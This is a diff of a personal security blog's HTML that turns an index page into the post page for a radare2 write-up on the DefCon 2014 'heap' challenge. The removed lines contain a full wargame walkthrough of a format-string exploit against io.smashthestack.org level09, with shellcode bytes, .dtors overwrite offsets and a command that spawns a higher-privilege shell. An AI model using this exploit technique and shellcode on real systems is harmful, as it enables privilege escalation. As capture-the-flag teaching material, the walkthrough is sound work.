@@ -11,7 +11,7 @@
 
   <title>
     
-      Álvaro Felipe Melchor &middot; Stuff about everything
+      Solving 'heap' from DefCON 2014 qualified with r2
     
     Álvaro Felipe Melchor
   </title>
@@ -50,7 +50,7 @@
     </div>
 
     <nav class="sidebar-nav">
-      <a class="sidebar-nav-item active" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/">Home</a>
 
       
 
@@ -108,18 +108,10 @@
 
 
     <div class="content container">
-      <div class="posts">
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/defcon-r2-heap">
-        Solving 'heap' from DefCON 2014 qualified with r2
-      </a>
-    </h1>
-
-    <span class="post-date">07 May 2016</span>
-
-    <p>This article will introduce r2 to resolve a simple CTF from Defcon &#39;14 using Linux. For those who do not know radare2 is a <code>unix-like reverse engineering framework and commandline tools</code> and the most important thing about it is that it is open source thus we can play with it. </p>
+      <div class="post">
+  <h1 class="post-title">Solving 'heap' from DefCON 2014 qualified with r2</h1>
+  <span class="post-date">07 May 2016</span>
+  <p>This article will introduce r2 to resolve a simple CTF from Defcon &#39;14 using Linux. For those who do not know radare2 is a <code>unix-like reverse engineering framework and commandline tools</code> and the most important thing about it is that it is open source thus we can play with it. </p>
 
 <p>Radare2 gives us the possibility to do reverse engineering and more by free as we will look on this post though we are not going too deeply into the commands. I leave it as an exercise for the reader.</p>
 
@@ -383,194 +375,76 @@ eb0c
 
 <p><a href="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews"><img src="https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews.png" alt="asciicast"></a> </p>
 
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/level09iosmash">
-        Format Strings - Level09 Smash the Stack
-      </a>
-    </h1>
-
-    <span class="post-date">12 Mar 2015</span>
-
-    <p>The topic for this entry is about format string vulnerability. The vulnerability appears when we use functions as <code>printf</code> and so on wrongly.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>  <span class="c1">//Good</span>
-<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// wrong - What would happen if buf is &quot;%x%x%x&quot;?</span>
-</code></pre></div>
-<p>When we call the latest printf call we are going to read from the stack. The layout would be the following</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">     Top of the Stack
--------------------------
-|       Address of buf  |
--------------------------
-|       Value of %x     |
--------------------------
-|       Value of %x     |
--------------------------
-|       Value of %x     |
--------------------------
-|        ....           |
--------------------------
-  Bottom of the Stack
-</code></pre></div>
-<p>The fun of this is that you can read, write on whatever direction you want. I am not going to write about how to do it since other have written before about <a href="http://inst.eecs.berkeley.edu/%7Ecs161/sp08/Notes/formatstring-1.2.pdf">this</a>.</p>
-
-<p>The code to exploit is the level09 from <a href="http://io.smashthestack.org">io.smashthestack.org</a>.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">int</span>  <span class="n">pad</span> <span class="o">=</span> <span class="mh">0xbabe</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
-    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ ./level09 AAAA%x%x%x%x
-AAAAbffffe343ff160d7c41414141
-level9@io:/levels$ ./level09 AAAA4%4\$x
-AAAA441414141
-</code></pre></div>
-<p>The idea is instead of <code>AAAA</code> that does nothing, write an interesting direction using <code>%n</code> to alter the normal execution of our program. There are different paths to follow to exploit this little code but I am going to use <code>.dtors</code> section. For those that don&#39;t know about <code>.dtors</code> is a section that all binaries on linux compiled with <code>gcc</code> have it. This section has an array of functions that will be called when main function exits.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ nm level09
-....
-080494d4 d __DTOR_END__
-080494d0 d __DTOR_LIST__
-080484c4 r __FRAME_END__
-....
-
-level9@io:/levels$ objdump -h level09
-
-level09:     file format elf32-i386
-
-Sections:
-Idx Name          Size      VMA       LMA       File off  Algn
-...
-
- 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
-                  CONTENTS, ALLOC, LOAD, READONLY, DATA
- 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
-                  CONTENTS, ALLOC, LOAD, READONLY, DATA
- 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
-                  CONTENTS, ALLOC, LOAD, DATA
- 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2
-                  CONTENTS, ALLOC, LOAD, DATA
-....
-</code></pre></div>
-<p>We can see that the section .dtors starts in <code>0x080494d0</code>.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text"> level9@io:/levels$ objdump -s -j .dtors level09
-
-level09:     file format elf32-i386
-
-Contents of section .dtors:
- 80494d0 ffffffff 00000000                    ........
-</code></pre></div>
-<p>How we have said before the <code>.dtors</code> section is an array of functions. This array always starts with <code>0xffffffff</code> and ends with the NULL address <code>0x00000000</code>. It&#39;s easy to deduce that level09 does not have any destructor. But that is not a reason to give up since this section is writable we are going to be able to write our own destructor :).</p>
-
-<p>The idea is write in <code>.dtors</code> with the goal of redirect the flow of the execution to the code that we will write in argv[1]. The first task that we must accomplish is to know the address of argv[1].</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level9@io:/levels<span class="nv">$ </span><span class="k">for</span> <span class="o">((</span><span class="nv">i</span> <span class="o">=</span> 250<span class="p">;</span> i &lt; 330<span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&quot;$i: &quot;</span> <span class="o">&amp;&amp;</span> ./level09 <span class="s2">&quot;%$i\$s&quot;</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -n <span class="s1">$&#39;\n&#39;</span> <span class="p">;</span> <span class="k">done</span>
-
-294: �É�
-295: ,�
-296: Segmentation fault
-297: 1�^����PTRh
-298: <span class="o">(</span>null<span class="o">)</span>
-299: ������������U���<span class="o">=</span>Е
-300: U���<span class="o">(</span>
-301: Segmentation fault
-302: 8���B���
-303: U��WVS�O
-304: U��<span class="o">]</span>Ít<span class="p">&amp;</span>
-305: U��WV1�S辊
-306:���
-307:
-308: Segmentation fault
-309: ./level09
-310: %310<span class="nv">$s</span>
-311: <span class="o">(</span>null<span class="o">)</span>
-312: <span class="nv">TERM</span><span class="o">=</span>xterm-256color
-313: <span class="nv">SHELL</span><span class="o">=</span>/bin/bash
-314: <span class="nv">SSH_CLIENT</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 22
-315: <span class="nv">OLDPWD</span><span class="o">=</span>/tmp
-316: <span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/5
-317: <span class="nv">USER</span><span class="o">=</span>level9
-318: <span class="nv">MAIL</span><span class="o">=</span>/var/mail/level9
-319: <span class="nv">PATH</span><span class="o">=</span>/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-320: <span class="nv">PWD</span><span class="o">=</span>/levels
-321: <span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8
-322: <span class="nv">SHLVL</span><span class="o">=</span>1
-323: <span class="nv">HOME</span><span class="o">=</span>/home/level9
-324: <span class="nv">LANGUAGE</span><span class="o">=</span>en_GB:en
-325: <span class="nv">LOGNAME</span><span class="o">=</span>level9
-326: <span class="nv">SSH_CONNECTION</span><span class="o">=</span>88.22.21.50 <span class="m">50860</span> 10.16.0.102 22
-327: <span class="nv">LC_CTYPE</span><span class="o">=</span>es_ES.UTF-8
-328: <span class="nv">_</span><span class="o">=</span>./level09
-329: <span class="o">(</span>null<span class="o">)</span>
-
-level9@io:/levels<span class="nv">$ </span>./level09 %310<span class="se">\$</span>x
-bffffe42
-</code></pre></div>
-<p>Basically we have walked through the stack to read everything from it to extract where resides argv[1]. Using direct parameter access we know that argv[1] is in 310th position and around <code>0xbffffe42</code>.
-The latest direction will vary regarding how many data we write. As much data we write in argv[1] the lower the address will be.</p>
-
-<p>Using the short write we are able to write two bytes so we are going to need two directions to write in it followed by the payload.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
-</code></pre></div>
-<p><code>\xd6\x94\x04\x08</code> is to write <code>bfff</code> and in <code>\xd4\x94\x04\x08</code> to write the lower bytes of argv[1]&#39;s address. We should know how much characters we need before to use <code>%n</code> to write the desire number. The payload has a length of <code>0x38</code>.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
-(gdb) p 0xbfff - 0x38
-$1 = 49095
-(gdb) p 0xfe42 - 0xbfff
-$2 = 15939
-</code></pre></div>
-<p>We are going to need 49095 more characters before to use <code>%n</code> to write <code>0xbfff</code> in <code>0x080494d6</code> and about 15939 to write <code>fe42</code> in <code>0x080494d4</code> although that will not be the exact value we will need to write. All this can be accomplished using the width specifier.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn
-</code></pre></div>
-<p>This would be the first part of our payload. The problem is that we don&#39;t know where argv[1] is in the memory since the array has grown. But we can deduce it using format string.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hx%15939x%310\$hx
-
-.....
-3fffdf6
-</code></pre></div>
-<p>It&#39;s means that in <code>0xbffffdf6</code> is our argv[1].</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">level9@io:/levels$ gdb -q
-(gdb) p 0xfdf6 - 0xbfff
-$1 = 15863
-</code></pre></div>
-<p>The problem is that if we write <code>fdf6</code> the flow of the program will go at the beginning of argv[1] but the initial part are the directions of <code>.dtors</code>. The direction to write would be around <code>0xbffffdfa</code> where our payload really starts and it begins with a nop slide to augment our likelihood of success.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) p 0xfdfa - 0xbfff
-$1 = 15867
-</code></pre></div>
-<p>And there it is, we have everything to exploit the vulnerability.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">./level09 $(printf &quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;)%49095x%4\$hn%15867x%5\$hn
-
-sh-4.2$ whoami
-level10
-sh-4.2$ cat /home/level10/.pass
-Os**********
-</code></pre></div>
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&text=Format Strings - Level09 Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
 </div>
 
-<div class="pagination">
-  
-    <a class="pagination-item older" href="/page2">Older</a>
-  
-  
-    <span class="pagination-item newer">Newer</span>
-  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'codepwn'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<div class="related">
+  <h2>Related Posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/posts/level09iosmash">
+            Format Strings - Level09 Smash the Stack
+            <small>12 Mar 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/posts/qcrk5crackme">
+            Defeating qcrk5 crackme
+            <small>25 Feb 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/posts/TLS">
+            TLS and PKI
+            <small>18 Feb 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
 </div>
+
+
     </div>
 
     
+<!-- Add Disqus comments. -->
+<div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'alvarofe'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
 
     <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
